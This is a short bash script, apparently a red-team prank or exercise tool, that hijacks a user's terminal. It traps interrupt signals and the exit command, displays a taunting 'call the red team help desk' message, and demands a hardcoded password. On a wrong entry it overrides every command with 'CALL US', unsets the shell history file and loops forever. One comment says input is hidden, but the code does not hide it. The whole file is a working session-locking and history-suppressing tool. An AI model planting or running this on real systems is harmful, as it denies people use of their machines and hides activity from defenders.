#!/bin/bash
PASSWORD="redteamisinyourwalls"

# Disable interrupt signals like Ctrl+C and Ctrl+Z
trap '' SIGINT SIGTSTP

# Disable exit command
disable_exit() {
    echo "nice try lol"
}

# Overwrite the exit, logout, and ctrl+d behavior
trap disable_exit EXIT

# Prompt for password
echo "Your terminal has been disabled by red team, please call the red team help desk at [extension]. Please be aware we are very busy. Thank you!"
read entered_password  # -s option hides the input

# Check if the entered password matches the defined password
if [[ "$entered_password" != "$PASSWORD" ]]; then
    echo "that's actually the wrong password :("

    # Trap and override all commands with a custom message
    trap 'echo "CALL US"' DEBUG
    
    # Disable command history (optional)
    unset HISTFILE
    
    # Lock the terminal in a loop, preventing further use
    while true; do
        sleep 1  # Keep the terminal locked until the session is terminated
    done
else
    # If password is correct, allow normal terminal access and re-enable signals
    trap - SIGINT SIGTSTP EXIT
    echo "Have funnnnnn!"
fi

